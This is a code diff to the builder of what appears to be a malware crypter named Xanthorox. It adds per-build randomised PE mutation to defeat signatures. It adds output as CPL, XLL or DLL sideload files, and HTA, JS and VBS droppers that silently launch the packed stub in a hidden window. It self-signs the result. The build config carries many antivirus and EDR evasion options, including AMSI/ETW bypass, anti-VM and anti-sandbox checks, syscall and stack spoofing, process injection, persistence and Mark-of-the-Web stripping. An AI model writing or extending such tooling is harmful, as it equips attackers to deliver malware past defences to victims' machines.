@@ -9,6 +9,7 @@
 // 
 using System;
 using System.IO;
+using System.Security.Cryptography;
 using System.Text;
 
 namespace XanthoroxCrypted.Core
@@ -124,6 +125,10 @@ namespace XanthoroxCrypted.Core
         {
             if (stubData == null || stubData.Length == 0)
                 return "Embedded stub data is empty.";
+
+            // ── HTA/JS/VBS: generate script wrapper instead of patching PE ──
+            if (config.SideloadFormat && config.SideloadFormatType >= 4)
+                return BuildScriptWrapper(stubData, outputPath, payload, key, config, researchParams);
 
             // ── Patch CONFIG ──
             int configOffset = FindMarker(stubData, MARKER_CONFIG);
@@ -245,7 +250,10 @@ namespace XanthoroxCrypted.Core
             }
 
             // ── PE Mutation (always active — makes every build unique) ──
-            PEMutator.Mutate(stubData, exclusions);
+            // Build Randomization: per-build seed randomizes pipeline order,
+            // junk layer count, section name style, entry point jitter
+            int? buildSeed = config.BuildRandomization ? RandomNumberGenerator.GetInt32(int.MaxValue) : (int?)null;
+            PEMutator.Mutate(stubData, exclusions, buildSeed);
 
             // ── Restore patched data regions after mutation ──
             Array.Copy(savedConfig, 0, stubData, configOffset, configRegionLen);
@@ -267,10 +275,24 @@ namespace XanthoroxCrypted.Core
             if (!Directory.Exists(dir))
                 Directory.CreateDirectory(dir);
 
-            File.WriteAllBytes(outputPath, stubData);
+            // Sideload DLL formats: rename extension
+            string finalPath = outputPath;
+            if (config.SideloadFormat && config.SideloadFormatType >= 1 && config.SideloadFormatType <= 3)
+            {
+                string ext = config.SideloadFormatType switch
+                {
+                    1 => ".cpl",   // CPL — Control Panel Applet
+                    2 => ".xll",   // XLL — Excel Add-in
+                    3 => ".dll",   // MSI — Custom Action DLL
+                    _ => ".dll"
+                };
+                finalPath = Path.ChangeExtension(outputPath, ext);
+            }
+
+            File.WriteAllBytes(finalPath, stubData);
 
             // ── L31: Self-Signed Code Signing (always active, post-write) ──
-            CodeSigner.SignPE(outputPath);
+            CodeSigner.SignPE(finalPath);
 
             return string.Empty;
         }
@@ -308,6 +330,237 @@ namespace XanthoroxCrypted.Core
                     return (int)(secRaw + (rva - secVa));
             }
             return -1;
+        }
+
+        // ═══════════════════════════════════════════════════════════
+        //  Script Wrapper Generation (HTA, JS, VBS)
+        //  Generates a script file that launches the embedded PE stub
+        // ═══════════════════════════════════════════════════════════
+        private static string BuildScriptWrapper(byte[] stubData, string outputPath, byte[] payload,
+            byte[] key, BuildConfig config, byte[]? researchParams)
+        {
+            // First build the PE stub normally (as EXE)
+            // The script wrapper will execute it at runtime
+            string dir = Path.GetDirectoryName(outputPath) ?? ".";
+            if (!Directory.Exists(dir))
+                Directory.CreateDirectory(dir);
+
+            string peName = Path.GetFileNameWithoutExtension(outputPath) + "_stub.exe";
+            string pePath = Path.Combine(dir, peName);
+
+            // Build the PE with SideloadFormat disabled (it's an EXE underneath)
+            var exeConfig = new BuildConfig
+            {
+                Version = config.Version,
+                AntiDebug = config.AntiDebug, AntiVM = config.AntiVM, AntiSandbox = config.AntiSandbox,
+                PatchlessAmsiEtw = config.PatchlessAmsiEtw, Fibers = config.Fibers, RunPE = config.RunPE,
+                ModuleStomp = config.ModuleStomp, Persist = config.Persist, Melt = config.Melt,
+                FakeError = config.FakeError, EkkoSleep = config.EkkoSleep, PPIDSpoof = config.PPIDSpoof,
+                EntropyNorm = config.EntropyNorm, IndirectSyscalls = config.IndirectSyscalls,
+                ThreadPool = config.ThreadPool, GuardPage = config.GuardPage, HWIDBind = config.HWIDBind,
+                PhantomDLL = config.PhantomDLL, CallbackDiv = config.CallbackDiv, MotwStrip = config.MotwStrip,
+                AntiEmulation = config.AntiEmulation, StagedLoad = config.StagedLoad,
+                KnownDllsUnhook = config.KnownDllsUnhook, StackSpoof = config.StackSpoof,
+                AntiMemScan = config.AntiMemScan, RemoteInjection = config.RemoteInjection,
+                DotNetLoading = config.DotNetLoading, ThreadNormalization = config.ThreadNormalization,
+                SideloadFormat = false, SideloadFormatType = 0,
+                BuildRandomization = config.BuildRandomization, AntiDump = config.AntiDump,
+                CfgBypass = config.CfgBypass, DllUnlink = config.DllUnlink,
+                PerEdrProfile = config.PerEdrProfile, StagedDelivery = config.StagedDelivery,
+                EncAlgorithm = config.EncAlgorithm, ResearchPackage = config.ResearchPackage,
+                HostProcess = config.HostProcess, Inflate = config.Inflate,
+                SectionMerge = config.SectionMerge, OverlayMode = config.OverlayMode
+            };
+            string peError = BuildInternal(stubData, pePath, payload, key, exeConfig, researchParams);
+            if (!string.IsNullOrEmpty(peError))
+                return peError;
+
+            // Generate script wrapper
+            string ext = config.SideloadFormatType switch
+            {
+                4 => ".hta",
+                5 => ".js",
+                6 => ".vbs",
+                _ => ".hta"
+            };
+            string scriptPath = Path.ChangeExtension(outputPath, ext);
+            string scriptContent = config.SideloadFormatType switch
+            {
+                4 => GenerateHta(peName),
+                5 => GenerateJs(peName),
+                6 => GenerateVbs(peName),
+                _ => GenerateHta(peName)
+            };
+            File.WriteAllText(scriptPath, scriptContent);
+
+            return string.Empty;
+        }
+
+        private static string GenerateHta(string peName)
+        {
+            return $@"<html>
+<head>
+<HTA:APPLICATION ID=""app"" WINDOWSTATE=""minimize"" SHOWINTASKBAR=""no"" />
+<script language=""VBScript"">
+Set shell = CreateObject(""WScript.Shell"")
+shell.Run ""{peName}"", 0, False
+window.close
+</script>
+</head>
+<body>
+</body>
+</html>";
+        }
+
+        private static string GenerateJs(string peName)
+        {
+            return $@"var shell = new ActiveXObject(""WScript.Shell"");
+shell.Run(""{peName}"", 0, false);";
+        }
+
+        private static string GenerateVbs(string peName)
+        {
+            return $@"Set shell = CreateObject(""WScript.Shell"")
+shell.Run ""{peName}"", 0, False";
+        }
+
+        // Internal build — same as original Build but without script wrapper logic
+        private static string BuildInternal(byte[] stubData, string outputPath, byte[] payload,
+            byte[] key, BuildConfig config, byte[]? researchParams)
+        {
+            // ── Patch CONFIG ──
+            int configOffset = FindMarker(stubData, MARKER_CONFIG);
+            if (configOffset < 0) return "CONFIG marker not found in stub.";
+            int configDataOffset = configOffset + 8;
+            byte[] configBytes = config.ToBytes();
+            Array.Copy(configBytes, 0, stubData, configDataOffset, configBytes.Length);
+
+            // ── Patch KEY ──
+            int keyOffset = FindMarker(stubData, MARKER_KEY);
+            if (keyOffset < 0) return "KEY marker not found in stub.";
+            int keyDataOffset = keyOffset + 8;
+            Array.Copy(key, 0, stubData, keyDataOffset, Math.Min(key.Length, 32));
+
+            // ── Patch PAYLOAD ──
+            int payloadOffset = FindMarker(stubData, MARKER_PAYLOAD);
+            if (payloadOffset < 0) return "PAYLOAD marker not found in stub.";
+
+            int payloadSizeOffset = payloadOffset + 8;
+            int payloadDataOffset = payloadSizeOffset + 4;
+
+            if (payload.Length > 512 * 1024)
+                return "Payload too large. Maximum 512KB.";
+
+            byte[] sizeBytes = BitConverter.GetBytes((uint)payload.Length);
+            Array.Copy(sizeBytes, 0, stubData, payloadSizeOffset, 4);
+            Array.Copy(payload, 0, stubData, payloadDataOffset, payload.Length);
+
+            // ── Patch RESEARCH PARAMS (if research package active) ──
+            int researchMarkerOffset = -1;
+            if (config.ResearchPackage > 0 && researchParams != null && researchParams.Length > 0)
+            {
+                researchMarkerOffset = FindMarker(stubData, MARKER_RESEARCH);
+                if (researchMarkerOffset < 0) return "RESEARCH marker not found in stub.";
+                int resSizeOffset = researchMarkerOffset + 8;
+                int resDataOffset = resSizeOffset + 4;
+
+                if (researchParams.Length > 5120)
+                    return "Research params too large. Maximum 5120 bytes.";
+
+                byte[] resSizeBytes = BitConverter.GetBytes((uint)researchParams.Length);
+                Array.Copy(resSizeBytes, 0, stubData, resSizeOffset, 4);
+                Array.Copy(researchParams, 0, stubData, resDataOffset, researchParams.Length);
+            }
+
+            // ── Save patched data regions before PE mutation ──
+            int configRegionLen = 8 + 44;
+            byte[] savedConfig = new byte[configRegionLen];
+            Array.Copy(stubData, configOffset, savedConfig, 0, configRegionLen);
+
+            int keyRegionLen = 8 + 32;
+            byte[] savedKey = new byte[keyRegionLen];
+            Array.Copy(stubData, keyOffset, savedKey, 0, keyRegionLen);
+
+            int payloadRegionLen = payloadDataOffset + payload.Length - payloadOffset;
+            byte[] savedPayload = new byte[payloadRegionLen];
+            Array.Copy(stubData, payloadOffset, savedPayload, 0, payloadRegionLen);
+
+            byte[] savedResearch = null;
+            int researchRegionLen = 0;
+            if (researchMarkerOffset >= 0 && researchParams != null && researchParams.Length > 0)
+            {
+                researchRegionLen = 8 + 4 + researchParams.Length;
+                savedResearch = new byte[researchRegionLen];
+                Array.Copy(stubData, researchMarkerOffset, savedResearch, 0, researchRegionLen);
+            }
+
+            // ── Build exclusion zones for PEMutator ──
+            var exclusions = new System.Collections.Generic.List<(int start, int end)>
+            {
+                (configOffset, configOffset + configRegionLen),
+                (keyOffset, keyOffset + keyRegionLen),
+                (payloadOffset, payloadOffset + payloadRegionLen)
+            };
+
+            byte[][] protectedStrings = {
+                System.Text.Encoding.ASCII.GetBytes("Xanthorox"),
+                System.Text.Encoding.ASCII.GetBytes("Xanthorox-OFCrypt"),
+            };
+            foreach (byte[] ps in protectedStrings)
+            {
+                for (int si = 0; si <= stubData.Length - ps.Length; si++)
+                {
+                    bool match = true;
+                    for (int j = 0; j < ps.Length && match; j++)
+                        if (stubData[si + j] != ps[j]) match = false;
+                    if (match)
+                        exclusions.Add((si, si + ps.Length));
+                }
+            }
+            if (researchMarkerOffset >= 0 && researchParams != null && researchParams.Length > 0)
+                exclusions.Add((researchMarkerOffset, researchMarkerOffset + researchRegionLen));
+
+            int peOffset = BitConverter.ToInt32(stubData, 0x3C);
+            int numSections = BitConverter.ToUInt16(stubData, peOffset + 6);
+            int optHeaderSize = BitConverter.ToUInt16(stubData, peOffset + 20);
+            int sectionHeadersEnd = peOffset + 24 + optHeaderSize + numSections * 40;
+            exclusions.Add((0, sectionHeadersEnd));
+
+            int relocDdOffset = peOffset + 24 + 112 + 5 * 8;
+            if (relocDdOffset + 8 <= stubData.Length)
+            {
+                uint relocRva = BitConverter.ToUInt32(stubData, relocDdOffset);
+                uint relocSz = BitConverter.ToUInt32(stubData, relocDdOffset + 4);
+                if (relocRva > 0 && relocSz > 0)
+                {
+                    int relocFileOff = RvaToFileOffset(stubData, relocRva);
+                    if (relocFileOff > 0)
+                        exclusions.Add((relocFileOff, relocFileOff + (int)relocSz));
+                }
+            }
+
+            PEMutator.Mutate(stubData, exclusions, config.BuildRandomization ? RandomNumberGenerator.GetInt32(int.MaxValue) : (int?)null);
+
+            Array.Copy(savedConfig, 0, stubData, configOffset, configRegionLen);
+            Array.Copy(savedKey, 0, stubData, keyOffset, keyRegionLen);
+            Array.Copy(savedPayload, 0, stubData, payloadOffset, payloadRegionLen);
+            if (savedResearch != null && researchMarkerOffset >= 0)
+                Array.Copy(savedResearch, 0, stubData, researchMarkerOffset, researchRegionLen);
+
+            if (config.SectionMerge)
+                PEMutator.MergeSections(stubData);
+
+            if (config.Inflate)
+                stubData = PEMutator.InflateBinary(stubData);
+
+            string dir = Path.GetDirectoryName(outputPath) ?? ".";
+            if (!Directory.Exists(dir))
+                Directory.CreateDirectory(dir);
+
+            File.WriteAllBytes(outputPath, stubData);
+            CodeSigner.SignPE(outputPath);
+
+            return string.Empty;
         }
     }
 }
